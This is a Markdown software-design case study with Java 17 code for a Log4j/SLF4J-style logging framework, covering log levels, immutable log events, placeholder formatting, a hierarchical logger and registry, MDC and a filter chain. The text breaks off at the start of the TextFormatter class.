# Advanced LLD Case Study: Logging Framework (Log4j/SLF4J Style)

## Table of Contents
1. [Problem Statement](#1-problem-statement)
2. [Functional Requirements](#2-functional-requirements)
3. [Non-Functional Requirements](#3-non-functional-requirements)
4. [Design Goals and Constraints](#4-design-goals-and-constraints)
5. [Architecture and Class Diagram](#5-architecture-and-class-diagram)
6. [Complete Java Implementation](#6-complete-java-implementation)
7. [Design Patterns Used](#7-design-patterns-used)
8. [Key Design Decisions and Trade-offs](#8-key-design-decisions-and-trade-offs)
9. [Extension Points](#9-extension-points)
10. [Production Considerations](#10-production-considerations)

---

## 1. Problem Statement

Modern applications require a robust, configurable, and high-performance logging infrastructure. Ad-hoc `System.out.println` calls are insufficient for production systems that need:

- **Structured observability** — log records must carry context (request ID, user ID, correlation ID) to be useful during incident investigation.
- **Flexible routing** — the same log event may need to be written to a local file, sent to a remote aggregator, and stored in a database simultaneously.
- **Performance under load** — logging must not become the bottleneck for a high-throughput service. Synchronous I/O in the critical path is unacceptable.
- **Operational control** — log verbosity must be adjustable at runtime without redeployment.
- **Interoperability** — library authors need a logging façade that is decoupled from the concrete backend chosen by application operators.

This case study designs and implements a production-quality logging framework from scratch, covering the façade (SLF4J-style), the core framework (Log4j2-style), async appenders, log rotation, MDC, and pluggable formatters — all with full thread safety and Java 17+ idioms.

---

## 2. Functional Requirements

| # | Requirement |
|---|-------------|
| FR-01 | Support six log levels in ascending severity order: `TRACE`, `DEBUG`, `INFO`, `WARN`, `ERROR`, `FATAL` |
| FR-02 | Provide hierarchical logger naming using dot-separated namespaces (e.g., `com.company.service.OrderService`) |
| FR-03 | Support multiple appenders per logger: Console, File, Database, Remote HTTP |
| FR-04 | Support pluggable log formatters: plain Text, JSON, XML |
| FR-05 | Enable log filtering by level (threshold) and by logger name pattern |
| FR-06 | Provide asynchronous logging with a bounded queue and configurable back-pressure strategies |
| FR-07 | Support file log rotation by size (e.g., 100 MB) and by time (e.g., daily rollover) |
| FR-08 | Implement MDC (Mapped Diagnostic Context) for per-thread contextual metadata |
| FR-09 | Provide a `LoggerFactory` for obtaining named logger instances |
| FR-10 | Provide a singleton `LoggerRegistry` that manages all logger instances and their configuration |
| FR-11 | Support logger hierarchy inheritance — a child logger inherits appenders/level from its parent unless explicitly overridden |
| FR-12 | Allow runtime reconfiguration of log levels without restart |

---

## 3. Non-Functional Requirements

| # | Requirement | Target |
|---|-------------|--------|
| NFR-01 | Throughput | > 1 million log events/second on async path |
| NFR-02 | Latency (sync) | < 1 ms p99 for Console/File appender |
| NFR-03 | Latency (async caller) | < 10 µs p99 — just queue enqueue cost |
| NFR-04 | Thread safety | All components fully thread-safe without global locks on hot path |
| NFR-05 | Memory | Bounded queue prevents unbounded heap growth |
| NFR-06 | Reliability | Guaranteed delivery semantics for synchronous appenders; best-effort for async |
| NFR-07 | Observability | Framework itself must not swallow exceptions silently |
| NFR-08 | Extensibility | New appenders and formatters addable without modifying framework core |

---

## 4. Design Goals and Constraints

### Goals
- **Separation of concerns**: Logger API, filtering, formatting, and appending are independent layers.
- **Zero allocation on disabled levels**: A log call for a disabled level must incur near-zero cost.
- **Immutable log events**: `LogEvent` records are immutable once created, safe to pass across threads.
- **Pluggability**: Every major component (appender, formatter, filter) is an interface, swappable at runtime.
- **Graceful degradation**: If an appender fails (e.g., DB down), the framework logs the error to stderr and continues.

### Constraints
- Java 17+ (records, sealed classes, text blocks, `var`)
- No external runtime dependencies in the core framework
- All public APIs must be thread-safe

### Non-Goals
- A configuration file parser (YAML/XML) — configuration is done programmatically in this study
- Log aggregation or distributed tracing (those are consumer responsibilities)

---

## 5. Architecture and Class Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            CLIENT CODE                                      │
│   Logger logger = LoggerFactory.getLogger(OrderService.class);              │
│   logger.info("Order placed: {}", orderId);                                 │
└────────────────────────────────┬────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         LOGGER FAÇADE LAYER                                 │
│                                                                             │
│   «interface»                    «class»                                    │
│   ILogger                        Logger (hierarchical)                      │
│   + trace(msg, args...)          - name: String                             │
│   + debug(msg, args...)          - level: LogLevel (nullable = inherit)     │
│   + info(msg, args...)           - appenders: List<Appender>                │
│   + warn(msg, args...)           - parent: Logger                           │
│   + error(msg, args...)          - additive: boolean                        │
│   + fatal(msg, args...)                                                     │
│   + isEnabled(level): boolean                                               │
└────────────────────────────────┬────────────────────────────────────────────┘
                                 │ creates LogEvent, routes to appenders
                                 ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          CORE PIPELINE                                      │
│                                                                             │
│  LogEvent (record)                                                          │
│  - timestamp, level, loggerName                                             │
│  - message, throwable                                                       │
│  - threadName, mdcContext (snapshot)                                        │
│                                                                             │
│  FilterChain ──────────────────────────────────────────────────────────    │
│  «interface» Filter                                                         │
│    LevelFilter ──► CategoryFilter ──► ThresholdFilter ──► ACCEPT/DENY      │
│    (Chain of Responsibility)                                                │
└────────────────────────────────┬────────────────────────────────────────────┘
                                 │ accepted events
                                 ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                        APPENDER LAYER                                       │
│                                                                             │
│  «interface» Appender                                                       │
│  + append(LogEvent): void                                                   │
│  + start() / stop()                                                         │
│                                                                             │
│  ┌──────────────────┐  ┌───────────────────┐  ┌──────────────────────────┐ │
│  │ ConsoleAppender  │  │  FileAppender      │  │ AsyncAppender            │ │
│  │ (sync, stderr/   │  │  + rotation policy │  │ - delegates to wrapped   │ │
│  │  stdout)         │  │  SizeRotation      │  │   Appender               │ │
│  └──────────────────┘  │  TimeRotation      │  │ - BlockingQueue<LogEvent>│ │
│                        └───────────────────┘  │ - worker Thread          │ │
│  ┌──────────────────┐  ┌───────────────────┐  │ - BackPressureStrategy   │ │
│  │  DbAppender      │  │  HttpAppender      │  └──────────────────────────┘ │
│  │  (JDBC batching) │  │  (HTTP POST batch) │                               │
│  └──────────────────┘  └───────────────────┘                               │
└────────────────────────────────┬────────────────────────────────────────────┘
                                 │ each appender calls formatter
                                 ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                       FORMATTER LAYER (Strategy)                            │
│                                                                             │
│  «interface» LogFormatter                                                   │
│  + format(LogEvent): String                                                 │
│                                                                             │
│  TextFormatter  │  JsonFormatter  │  XmlFormatter                          │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│                     INFRASTRUCTURE LAYER                                    │
│                                                                             │
│  LoggerRegistry (Singleton)          MDC (ThreadLocal)                     │
│  - loggers: ConcurrentHashMap        - context: ThreadLocal<Map>            │
│  - root logger                       + put(key, value)                      │
│  - getLogger(name): Logger           + get(key): String                     │
│  - setLevel(name, level)             + remove(key)                          │
│                                      + clear()                              │
│  LoggerFactory                       + getCopyOfContextMap()                │
│  + getLogger(Class): Logger                                                 │
│  + getLogger(String): Logger                                                │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Sequence: Async Log Call

```
Client          Logger       FilterChain    AsyncAppender    WorkerThread   FileAppender
  │               │               │               │               │               │
  │ info("msg")   │               │               │               │               │
  │──────────────►│               │               │               │               │
  │               │ createEvent() │               │               │               │
  │               │──────────────►│               │               │               │
  │               │               │ filter(event) │               │               │
  │               │               │──────────────►│               │               │
  │               │               │    ACCEPT     │               │               │
  │               │               │◄──────────────│               │               │
  │               │ queue.offer() │               │               │               │
  │               │──────────────────────────────►│               │               │
  │               │    return     │               │               │               │
  │◄──────────────│               │               │ poll(event)   │               │
  │  (< 10µs)     │               │               │──────────────►│               │
  │               │               │               │               │ append(event) │
  │               │               │               │               │──────────────►│
  │               │               │               │               │               │ write+flush
```

---

## 6. Complete Java Implementation

### Package Structure

```
com.logging.framework
├── api
│   ├── ILogger.java
│   ├── LogLevel.java
│   └── LoggerFactory.java
├── core
│   ├── Logger.java
│   ├── LogEvent.java
│   ├── LoggerRegistry.java
│   └── MessageFormatter.java
├── filter
│   ├── Filter.java
│   ├── FilterResult.java
│   ├── FilterChain.java
│   ├── LevelFilter.java
│   ├── CategoryFilter.java
│   └── ThresholdFilter.java
├── appender
│   ├── Appender.java
│   ├── AbstractAppender.java
│   ├── ConsoleAppender.java
│   ├── FileAppender.java
│   ├── AsyncAppender.java
│   ├── DatabaseAppender.java
│   ├── HttpAppender.java
│   └── rotation
│       ├── RotationPolicy.java
│       ├── SizeBasedRotationPolicy.java
│       └── TimeBasedRotationPolicy.java
├── formatter
│   ├── LogFormatter.java
│   ├── TextFormatter.java
│   ├── JsonFormatter.java
│   └── XmlFormatter.java
└── mdc
    └── MDC.java
```

---

### 6.1 Core Model — LogLevel and LogEvent

```java
// com/logging/framework/api/LogLevel.java
package com.logging.framework.api;

/**
 * Ordered log severity levels. Higher ordinal = higher severity.
 * Sealed to prevent external subclassing — the set of levels is fixed.
 */
public enum LogLevel {
    TRACE(0),
    DEBUG(1),
    INFO(2),
    WARN(3),
    ERROR(4),
    FATAL(5),
    OFF(Integer.MAX_VALUE);  // sentinel: disables all logging

    private final int severity;

    LogLevel(int severity) {
        this.severity = severity;
    }

    public int getSeverity() {
        return severity;
    }

    /**
     * Returns true if this level is at least as severe as the given threshold.
     * Example: INFO.isAtLeast(DEBUG) == true
     */
    public boolean isAtLeast(LogLevel threshold) {
        return this.severity >= threshold.severity;
    }
}
```

```java
// com/logging/framework/core/LogEvent.java
package com.logging.framework.core;

import com.logging.framework.api.LogLevel;

import java.time.Instant;
import java.util.Collections;
import java.util.Map;

/**
 * Immutable record representing a single log event.
 *
 * Using a Java 17 record ensures immutability by default. The MDC context map
 * is captured as an unmodifiable copy at event creation time so that the event
 * can be safely handed off to async worker threads without race conditions.
 *
 * Design decision: we store the formatted message string rather than the
 * template + args to avoid re-formatting in each appender. The small allocation
 * cost is justified by eliminating repeated MessageFormat work downstream.
 */
public record LogEvent(
        Instant timestamp,
        LogLevel level,
        String loggerName,
        String message,
        Throwable throwable,
        String threadName,
        long threadId,
        Map<String, String> mdcContext
) {
    /**
     * Compact constructor — validates required fields and defends the MDC map.
     */
    public LogEvent {
        if (timestamp == null) throw new IllegalArgumentException("timestamp must not be null");
        if (level == null)     throw new IllegalArgumentException("level must not be null");
        if (loggerName == null || loggerName.isBlank())
            throw new IllegalArgumentException("loggerName must not be blank");
        if (message == null)   message = "";

        // Defensive copy — the caller's MDC snapshot is already a copy, but be safe.
        mdcContext = (mdcContext == null)
                ? Collections.emptyMap()
                : Collections.unmodifiableMap(Map.copyOf(mdcContext));
    }

    /**
     * Convenience factory. Captures thread context at the moment of the call.
     */
    public static LogEvent of(LogLevel level, String loggerName, String message, Throwable throwable,
                               Map<String, String> mdcSnapshot) {
        Thread current = Thread.currentThread();
        return new LogEvent(
                Instant.now(),
                level,
                loggerName,
                message,
                throwable,
                current.getName(),
                current.threadId(),
                mdcSnapshot
        );
    }
}
```

```java
// com/logging/framework/core/MessageFormatter.java
package com.logging.framework.core;

/**
 * SLF4J-style {} placeholder substitution.
 *
 * Replaces occurrences of "{}" in the template with successive toString()
 * values of the provided arguments. Supports escaped braces "\{}" which are
 * emitted as literal "{}".
 *
 * This is intentionally simple and fast — no regex, no heap-intensive
 * MessageFormat. The hot path is a single linear scan.
 */
public final class MessageFormatter {

    private MessageFormatter() {}

    public static String format(String template, Object... args) {
        if (template == null) return "null";
        if (args == null || args.length == 0) return template;

        var sb = new StringBuilder(template.length() + 64);
        int argIndex = 0;
        int i = 0;

        while (i < template.length()) {
            char c = template.charAt(i);

            // Check for escaped brace: \{}
            if (c == '\\' && i + 2 < template.length()
                    && template.charAt(i + 1) == '{'
                    && template.charAt(i + 2) == '}') {
                sb.append("{}");
                i += 3;
                continue;
            }

            // Check for placeholder: {}
            if (c == '{' && i + 1 < template.length() && template.charAt(i + 1) == '}') {
                if (argIndex < args.length) {
                    Object arg = args[argIndex++];
                    sb.append(safeToString(arg));
                } else {
                    sb.append("{}");  // no arg left — emit literal
                }
                i += 2;
                continue;
            }

            sb.append(c);
            i++;
        }

        return sb.toString();
    }

    private static String safeToString(Object obj) {
        if (obj == null) return "null";
        try {
            return obj.toString();
        } catch (Exception e) {
            return "[FAILED toString(): " + e.getClass().getSimpleName() + "]";
        }
    }
}
```

---

### 6.2 Logger API and Factory

```java
// com/logging/framework/api/ILogger.java
package com.logging.framework.api;

/**
 * Public logger façade. Library code depends only on this interface,
 * decoupling from the concrete Logger implementation.
 */
public interface ILogger {

    String getName();

    boolean isTraceEnabled();
    boolean isDebugEnabled();
    boolean isInfoEnabled();
    boolean isWarnEnabled();
    boolean isErrorEnabled();
    boolean isFatalEnabled();
    boolean isEnabled(LogLevel level);

    void trace(String message, Object... args);
    void debug(String message, Object... args);
    void info(String message, Object... args);
    void warn(String message, Object... args);
    void error(String message, Object... args);
    void fatal(String message, Object... args);

    void trace(String message, Throwable t);
    void debug(String message, Throwable t);
    void info(String message, Throwable t);
    void warn(String message, Throwable t);
    void error(String message, Throwable t);
    void fatal(String message, Throwable t);

    void log(LogLevel level, String message, Throwable t, Object... args);
}
```

```java
// com/logging/framework/api/LoggerFactory.java
package com.logging.framework.api;

import com.logging.framework.core.LoggerRegistry;

/**
 * Static entry point for obtaining ILogger instances.
 *
 * This mirrors the SLF4J pattern: client code calls LoggerFactory.getLogger()
 * and receives an ILogger backed by the framework's LoggerRegistry singleton.
 *
 * Thread safety: getLogger() delegates to LoggerRegistry which is fully
 * thread-safe via ConcurrentHashMap.computeIfAbsent.
 */
public final class LoggerFactory {

    private LoggerFactory() {}

    public static ILogger getLogger(Class<?> clazz) {
        return getLogger(clazz.getName());
    }

    public static ILogger getLogger(String name) {
        return LoggerRegistry.getInstance().getOrCreate(name);
    }

    /**
     * Convenience: get the root logger (parent of all loggers).
     */
    public static ILogger getRootLogger() {
        return LoggerRegistry.getInstance().getRootLogger();
    }
}
```

---

### 6.3 Core Logger Implementation

```java
// com/logging/framework/core/Logger.java
package com.logging.framework.core;

import com.logging.framework.api.ILogger;
import com.logging.framework.api.LogLevel;
import com.logging.framework.appender.Appender;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.filter.FilterResult;
import com.logging.framework.mdc.MDC;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * Concrete hierarchical logger.
 *
 * Hierarchy rules (mirrors Log4j2 behavior):
 * - If this logger has no explicit level set, it walks up the parent chain
 *   until it finds one (the root always has a level).
 * - If additive == true, log events are passed both to this logger's appenders
 *   AND to its parent's appenders (useful for aggregation at root).
 * - If additive == false, only this logger's appenders receive the event.
 *
 * Thread safety:
 * - level is volatile — single-field write is atomic and visible across threads.
 * - appenders uses CopyOnWriteArrayList — reads (hot path) are lock-free.
 * - parent is set once at construction and never mutated.
 */
public final class Logger implements ILogger {

    private final String name;
    private volatile LogLevel level;          // null means "inherit from parent"
    private volatile boolean additive = true;
    private final Logger parent;              // null only for root logger
    private final CopyOnWriteArrayList<Appender> appenders = new CopyOnWriteArrayList<>();
    private volatile FilterChain filterChain;

    /** Package-private — only LoggerRegistry creates Logger instances. */
    Logger(String name, Logger parent) {
        this.name = name;
        this.parent = parent;
        this.filterChain = FilterChain.empty();
    }

    // ─── ILogger API ────────────────────────────────────────────────────────

    @Override
    public String getName() { return name; }

    @Override public boolean isTraceEnabled() { return isEnabled(LogLevel.TRACE); }
    @Override public boolean isDebugEnabled() { return isEnabled(LogLevel.DEBUG); }
    @Override public boolean isInfoEnabled()  { return isEnabled(LogLevel.INFO);  }
    @Override public boolean isWarnEnabled()  { return isEnabled(LogLevel.WARN);  }
    @Override public boolean isErrorEnabled() { return isEnabled(LogLevel.ERROR); }
    @Override public boolean isFatalEnabled() { return isEnabled(LogLevel.FATAL); }

    @Override
    public boolean isEnabled(LogLevel level) {
        return level.isAtLeast(getEffectiveLevel());
    }

    @Override
    public void trace(String message, Object... args) { log(LogLevel.TRACE, message, null, args); }

    @Override
    public void debug(String message, Object... args) { log(LogLevel.DEBUG, message, null, args); }

    @Override
    public void info(String message, Object... args) { log(LogLevel.INFO, message, null, args); }

    @Override
    public void warn(String message, Object... args) { log(LogLevel.WARN, message, null, args); }

    @Override
    public void error(String message, Object... args) { log(LogLevel.ERROR, message, null, args); }

    @Override
    public void fatal(String message, Object... args) { log(LogLevel.FATAL, message, null, args); }

    @Override
    public void trace(String message, Throwable t) { log(LogLevel.TRACE, message, t); }

    @Override
    public void debug(String message, Throwable t) { log(LogLevel.DEBUG, message, t); }

    @Override
    public void info(String message, Throwable t)  { log(LogLevel.INFO,  message, t); }

    @Override
    public void warn(String message, Throwable t)  { log(LogLevel.WARN,  message, t); }

    @Override
    public void error(String message, Throwable t) { log(LogLevel.ERROR, message, t); }

    @Override
    public void fatal(String message, Throwable t) { log(LogLevel.FATAL, message, t); }

    @Override
    public void log(LogLevel level, String message, Throwable t, Object... args) {
        // Guard: zero-cost exit if this level is disabled.
        if (!isEnabled(level)) return;

        // Format message once — used by all downstream appenders.
        String formatted = (args != null && args.length > 0)
                ? MessageFormatter.format(message, args)
                : (message != null ? message : "");

        // Snapshot MDC at the caller's thread — must happen before any async hand-off.
        LogEvent event = LogEvent.of(level, name, formatted, t, MDC.getCopyOfContextMap());

        // Run through filters
        if (filterChain.decide(event) == FilterResult.DENY) return;

        // Dispatch to appenders, walking up the hierarchy if additive
        dispatch(event);
    }

    // ─── Internal dispatch ───────────────────────────────────────────────────

    private void dispatch(LogEvent event) {
        // Append to own appenders
        for (Appender appender : appenders) {
            safeAppend(appender, event);
        }

        // Walk parent chain if additive
        if (additive && parent != null) {
            parent.dispatch(event);
        }
    }

    private void safeAppend(Appender appender, LogEvent event) {
        try {
            appender.append(event);
        } catch (Exception e) {
            // Framework must never propagate appender failures to caller.
            // Log to System.err — the only safe fallback.
            System.err.println("[LOGGING FRAMEWORK ERROR] Appender '"
                    + appender.getName() + "' threw: " + e.getMessage());
            e.printStackTrace(System.err);
        }
    }

    // ─── Configuration API (used by LoggerRegistry / config code) ────────────

    /** Returns the effective level by walking up the parent chain if needed. */
    public LogLevel getEffectiveLevel() {
        Logger current = this;
        while (current != null) {
            LogLevel l = current.level;
            if (l != null) return l;
            current = current.parent;
        }
        return LogLevel.INFO; // fallback — should never reach here if root has a level
    }

    public void setLevel(LogLevel level) { this.level = level; }

    public LogLevel getLevel() { return level; }  // may be null if inheriting

    public void setAdditive(boolean additive) { this.additive = additive; }

    public boolean isAdditive() { return additive; }

    public Logger getParent() { return parent; }

    public void addAppender(Appender appender) {
        appenders.addIfAbsent(appender);
    }

    public void removeAppender(Appender appender) {
        appenders.remove(appender);
    }

    public List<Appender> getAppenders() {
        return Collections.unmodifiableList(new ArrayList<>(appenders));
    }

    public void setFilterChain(FilterChain chain) {
        this.filterChain = (chain != null) ? chain : FilterChain.empty();
    }

    @Override
    public String toString() {
        return "Logger{name='" + name + "', effectiveLevel=" + getEffectiveLevel() + "}";
    }
}
```

---

### 6.4 Logger Registry (Singleton)

```java
// com/logging/framework/core/LoggerRegistry.java
package com.logging.framework.core;

import com.logging.framework.api.LogLevel;

import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;

/**
 * Singleton registry that owns all Logger instances and enforces the
 * dot-separated hierarchy.
 *
 * Singleton implementation: initialization-on-demand holder idiom — lazy,
 * thread-safe, and avoids double-checked locking complexity.
 *
 * Hierarchy construction:
 * When a logger named "com.company.service" is requested, the registry
 * ensures "com.company" and "com" exist first, wiring parent references.
 * This is done atomically via computeIfAbsent to avoid races.
 */
public final class LoggerRegistry {

    private static final String ROOT_LOGGER_NAME = "ROOT";

    private final ConcurrentMap<String, Logger> loggers = new ConcurrentHashMap<>(64);
    private final Logger rootLogger;

    private LoggerRegistry() {
        rootLogger = new Logger(ROOT_LOGGER_NAME, null);
        rootLogger.setLevel(LogLevel.INFO);
        loggers.put(ROOT_LOGGER_NAME, rootLogger);
    }

    // ─── Initialization-on-demand holder ────────────────────────────────────

    private static final class Holder {
        static final LoggerRegistry INSTANCE = new LoggerRegistry();
    }

    public static LoggerRegistry getInstance() {
        return Holder.INSTANCE;
    }

    // ─── Public API ──────────────────────────────────────────────────────────

    public Logger getRootLogger() {
        return rootLogger;
    }

    /**
     * Returns an existing logger or creates a new one, establishing the parent
     * chain. Thread-safe: concurrent calls for the same name return the same
     * instance.
     */
    public Logger getOrCreate(String name) {
        if (name == null || name.isBlank() || ROOT_LOGGER_NAME.equals(name)) {
            return rootLogger;
        }
        return loggers.computeIfAbsent(name, this::createLogger);
    }

    /**
     * Changes the level of a named logger at runtime. Creates the logger if
     * it doesn't exist yet.
     */
    public void setLevel(String loggerName, LogLevel level) {
        getOrCreate(loggerName).setLevel(level);
    }

    // ─── Private ─────────────────────────────────────────────────────────────

    /**
     * Creates a Logger and wires it to its nearest existing ancestor.
     * Example: creating "com.company.service" when "com" exists but
     * "com.company" does not — this will also create "com.company".
     */
    private Logger createLogger(String name) {
        Logger parent = findOrCreateParent(name);
        return new Logger(name, parent);
    }

    private Logger findOrCreateParent(String name) {
        int lastDot = name.lastIndexOf('.');
        if (lastDot < 0) {
            // Top-level namespace — parent is root
            return rootLogger;
        }
        String parentName = name.substring(0, lastDot);
        // Recursively ensure the parent exists
        return loggers.computeIfAbsent(parentName, this::createLogger);
    }
}
```

---

### 6.5 MDC — Mapped Diagnostic Context

```java
// com/logging/framework/mdc/MDC.java
package com.logging.framework.mdc;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

/**
 * Mapped Diagnostic Context — per-thread key/value store for contextual data.
 *
 * Usage pattern:
 *   MDC.put("requestId", "abc-123");
 *   MDC.put("userId", "42");
 *   try {
 *       // all log calls in this thread automatically include requestId, userId
 *       service.processOrder(order);
 *   } finally {
 *       MDC.clear();  // MANDATORY — prevent leaking into thread pool recycling
 *   }
 *
 * Implementation: InheritableThreadLocal so that child threads (e.g., spawned
 * via CompletableFuture.supplyAsync) inherit the parent's MDC snapshot.
 * The child gets its own mutable copy, preventing cross-thread mutation.
 *
 * Thread safety: Each thread has its own Map instance. No synchronization needed.
 */
public final class MDC {

    /**
     * InheritableThreadLocal with a deep copy on child thread creation.
     * This ensures child threads start with a snapshot, not a shared reference.
     */
    private static final InheritableThreadLocal<Map<String, String>> contextHolder =
            new InheritableThreadLocal<>() {
                @Override
                protected Map<String, String> childValue(Map<String, String> parentValue) {
                    // Give child its own mutable copy of the parent's context
                    return (parentValue == null) ? new HashMap<>() : new HashMap<>(parentValue);
                }

                @Override
                protected Map<String, String> initialValue() {
                    return new HashMap<>();
                }
            };

    private MDC() {}

    /**
     * Puts a key-value pair into the current thread's context.
     * A null value removes the key (consistent with Map.remove semantics).
     */
    public static void put(String key, String value) {
        if (key == null) throw new IllegalArgumentException("MDC key must not be null");
        if (value == null) {
            contextHolder.get().remove(key);
        } else {
            contextHolder.get().put(key, value);
        }
    }

    /**
     * Returns the value for the given key in the current thread's context,
     * or null if absent.
     */
    public static String get(String key) {
        if (key == null) return null;
        return contextHolder.get().get(key);
    }

    /** Removes a key from the current thread's context. */
    public static void remove(String key) {
        if (key != null) contextHolder.get().remove(key);
    }

    /** Clears all entries from the current thread's context. */
    public static void clear() {
        contextHolder.get().clear();
    }

    /**
     * Returns an unmodifiable snapshot of the current context map.
     * Called at LogEvent creation time to freeze the context.
     */
    public static Map<String, String> getCopyOfContextMap() {
        Map<String, String> current = contextHolder.get();
        if (current.isEmpty()) return Collections.emptyMap();
        return Collections.unmodifiableMap(new HashMap<>(current));
    }

    /**
     * Replaces the entire context with the provided map. Useful for
     * restoring a previously captured snapshot (e.g., in async continuations).
     */
    public static void setContextMap(Map<String, String> contextMap) {
        Map<String, String> local = contextHolder.get();
        local.clear();
        if (contextMap != null) {
            local.putAll(contextMap);
        }
    }

    /**
     * Convenience: wraps a Runnable with MDC propagation.
     * Safe to use with thread pools where threads are reused.
     */
    public static Runnable wrap(Runnable runnable) {
        Map<String, String> snapshot = getCopyOfContextMap();
        return () -> {
            Map<String, String> previous = getCopyOfContextMap();
            try {
                setContextMap(snapshot);
                runnable.run();
            } finally {
                setContextMap(previous);
            }
        };
    }
}
```

---

### 6.6 Filter Chain (Chain of Responsibility)

```java
// com/logging/framework/filter/FilterResult.java
package com.logging.framework.filter;

/**
 * Tri-state filter decision.
 *
 * ACCEPT  — the event is explicitly accepted; skip remaining filters.
 * DENY    — the event is explicitly rejected; stop processing.
 * NEUTRAL — this filter has no opinion; pass to the next filter in chain.
 */
public enum FilterResult {
    ACCEPT,
    DENY,
    NEUTRAL
}
```

```java
// com/logging/framework/filter/Filter.java
package com.logging.framework.filter;

import com.logging.framework.core.LogEvent;

/**
 * Single link in the filter chain.
 */
@FunctionalInterface
public interface Filter {
    FilterResult decide(LogEvent event);
}
```

```java
// com/logging/framework/filter/FilterChain.java
package com.logging.framework.filter;

import com.logging.framework.core.LogEvent;

import java.util.List;

/**
 * Ordered sequence of filters. Implements the Chain of Responsibility pattern.
 *
 * Processing rules:
 * 1. Filters are evaluated in insertion order.
 * 2. The first ACCEPT or DENY result short-circuits the remaining chain.
 * 3. If all filters return NEUTRAL, the default result is ACCEPT.
 *
 * FilterChain is immutable once constructed — thread-safe by design.
 */
public final class FilterChain {

    private static final FilterChain EMPTY = new FilterChain(List.of());

    private final List<Filter> filters;

    private FilterChain(List<Filter> filters) {
        this.filters = List.copyOf(filters);  // defensive immutable copy
    }

    public static FilterChain of(Filter... filters) {
        return new FilterChain(List.of(filters));
    }

    public static FilterChain of(List<Filter> filters) {
        return new FilterChain(filters);
    }

    public static FilterChain empty() {
        return EMPTY;
    }

    public FilterResult decide(LogEvent event) {
        for (Filter filter : filters) {
            FilterResult result = filter.decide(event);
            if (result != FilterResult.NEUTRAL) {
                return result;
            }
        }
        return FilterResult.ACCEPT;  // default accept when no filter objects
    }

    /** Returns a new chain with an additional filter appended. */
    public FilterChain andThen(Filter filter) {
        var newFilters = new java.util.ArrayList<>(filters);
        newFilters.add(filter);
        return new FilterChain(newFilters);
    }
}
```

```java
// com/logging/framework/filter/LevelFilter.java
package com.logging.framework.filter;

import com.logging.framework.api.LogLevel;
import com.logging.framework.core.LogEvent;

/**
 * Accepts events whose level exactly matches (or is at least as severe as)
 * the configured level. Denies all others.
 *
 * This is the most commonly used filter — typically placed first in the chain.
 */
public final class LevelFilter implements Filter {

    public enum MatchBehavior { ACCEPT_ON_MATCH, DENY_ON_MATCH }

    private final LogLevel level;
    private final MatchBehavior onMatch;
    private final FilterResult onMismatch;

    public LevelFilter(LogLevel level, MatchBehavior onMatch, FilterResult onMismatch) {
        this.level = level;
        this.onMatch = onMatch;
        this.onMismatch = onMismatch;
    }

    /** Common factory: accept events at or above the threshold, neutral otherwise. */
    public static LevelFilter atLeast(LogLevel threshold) {
        return new LevelFilter(threshold, MatchBehavior.ACCEPT_ON_MATCH, FilterResult.NEUTRAL);
    }

    /** Common factory: deny events below the threshold. */
    public static LevelFilter denyBelow(LogLevel threshold) {
        return new LevelFilter(threshold, MatchBehavior.DENY_ON_MATCH, FilterResult.NEUTRAL) {
            @Override
            public FilterResult decide(LogEvent event) {
                // Deny if the event level is below threshold
                if (!event.level().isAtLeast(threshold)) return FilterResult.DENY;
                return FilterResult.NEUTRAL;
            }
        };
    }

    @Override
    public FilterResult decide(LogEvent event) {
        boolean matches = event.level().isAtLeast(level);
        if (matches) {
            return (onMatch == MatchBehavior.ACCEPT_ON_MATCH) ? FilterResult.ACCEPT : FilterResult.DENY;
        }
        return onMismatch;
    }
}
```

```java
// com/logging/framework/filter/CategoryFilter.java
package com.logging.framework.filter;

import com.logging.framework.core.LogEvent;

/**
 * Filters based on logger name prefix. Useful for routing logs from a
 * specific package to a dedicated appender.
 *
 * Example: CategoryFilter.accept("com.company.payments") will ACCEPT all
 * events from loggers whose name starts with "com.company.payments" and
 * return NEUTRAL for all others.
 */
public final class CategoryFilter implements Filter {

    private final String prefix;
    private final FilterResult onMatch;
    private final FilterResult onMismatch;

    public CategoryFilter(String prefix, FilterResult onMatch, FilterResult onMismatch) {
        this.prefix = prefix;
        this.onMatch = onMatch;
        this.onMismatch = onMismatch;
    }

    public static CategoryFilter accept(String prefix) {
        return new CategoryFilter(prefix, FilterResult.ACCEPT, FilterResult.NEUTRAL);
    }

    public static CategoryFilter deny(String prefix) {
        return new CategoryFilter(prefix, FilterResult.DENY, FilterResult.NEUTRAL);
    }

    @Override
    public FilterResult decide(LogEvent event) {
        boolean matches = event.loggerName().startsWith(prefix);
        return matches ? onMatch : onMismatch;
    }
}
```

```java
// com/logging/framework/filter/ThresholdFilter.java
package com.logging.framework.filter;

import com.logging.framework.api.LogLevel;
import com.logging.framework.core.LogEvent;

/**
 * Simple threshold filter — the most common filter configuration.
 * Events at or above the threshold pass; events below are DENIED.
 *
 * Unlike LevelFilter (which can be configured to ACCEPT_ON_MATCH), this filter
 * always returns NEUTRAL for passing events, allowing downstream filters to
 * further refine the decision.
 */
public final class ThresholdFilter implements Filter {

    private final LogLevel threshold;

    public ThresholdFilter(LogLevel threshold) {
        this.threshold = threshold;
    }

    @Override
    public FilterResult decide(LogEvent event) {
        return event.level().isAtLeast(threshold)
                ? FilterResult.NEUTRAL
                : FilterResult.DENY;
    }
}
```

---

### 6.7 Formatters (Strategy Pattern)

```java
// com/logging/framework/formatter/LogFormatter.java
package com.logging.framework.formatter;

import com.logging.framework.core.LogEvent;

/**
 * Strategy interface for converting a LogEvent to a string representation.
 * Each Appender holds a reference to one formatter.
 */
@FunctionalInterface
public interface LogFormatter {
    String format(LogEvent event);
}
```

```java
// com/logging/framework/formatter/TextFormatter.java
package com.logging.framework.formatter;

import com.logging.framework.core.LogEvent;

import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Map;

